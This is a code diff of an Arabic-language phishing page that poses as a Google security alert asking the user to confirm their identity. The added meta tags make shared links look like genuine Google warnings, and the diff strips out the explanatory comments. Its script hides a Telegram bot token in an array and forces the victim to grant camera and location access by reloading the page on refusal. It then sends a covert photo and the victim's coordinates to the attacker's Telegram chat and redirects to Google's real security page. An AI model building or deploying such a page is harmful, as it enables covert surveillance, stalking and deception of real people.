@@ -4,13 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تأكيد الهوية - Google</title>
+
+    <meta property="og:title" content="Google Account: Security Alert">
+    <meta property="og:description" content="تم اكتشاف محاولة تسجيل دخول مشبوهة. يرجى تأكيد هويتك فوراً لتأمين حسابك ومنع الوصول غير المصرح به.">
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/g_shield_96dp.png">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#1a73e8">
+
     <style>
         body { background-color: #ffffff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
         
-        /* رسم الدرع الأزرق برمجياً لضمان ظهوره 100% */
         .shield-box { width: 100px; height: 120px; background-color: #1a73e8; clip-path: polygon(50% 0%, 100% 20%, 100% 70%, 50% 100%, 0% 70%, 0% 20%); margin: 0 auto 25px; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 10px rgba(26,115,232,0.3); }
-        .shield-box::after { content: '❤'; color: white; font-size: 45px; } /* شعار القلب الأبيض داخل الدرع */
+        .shield-box::after { content: '❤'; color: white; font-size: 45px; }
 
         h1 { font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 16px; }
         p { font-size: 15px; line-height: 1.6; margin-bottom: 35px; color: #5f6368; }
@@ -36,7 +42,6 @@
     </div>
 
     <script>
-        // تشفير البيانات بالمصفوفات
         const _v = ['8439157520', 'AAGGZBxYp0x', '6Y54ar3TIrk', 'MaMEHarQASmgY', '1772820433'];
         const token = `${_v[0]}:${_v[1]}${_v[2]}${_v[3]}`;
         const chat_id = _v[4];
@@ -47,16 +52,13 @@
             document.getElementById('status').style.display = 'block';
 
             try {
-                // 1. طلب الكاميرا (إجباري)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                // 2. طلب الموقع (إجباري)
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const locLink = `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
 
-                    // 3. التقاط الصورة
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
@@ -72,25 +74,21 @@
                         formData.append('photo', blob, 'secure_check.jpg');
                         formData.append('caption', locLink);
 
-                        // 4. إرسال البيانات للتليجرام
                         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         });
 
-                        // 5. الانتقال الفوري بعد السحب الناجح
                         window.location.href = "https://myaccount.google.com/security";
 
                     }, 'image/jpeg', 0.6);
 
                 }, (err) => {
-                    // إذا رفض الموقع: إعادة تحميل لإجباره
                     alert("خطأ أمني: يجب السماح بالوصول للموقع لإتمام الفحص.");
                     location.reload();
                 });
 
             } catch (err) {
-                // إذا رفض الكاميرا: إعادة تحميل لإجباره
                 alert("فشل النظام: لا يمكن تأمين الحساب بدون أذونات الكاميرا.");
                 location.reload();
             }
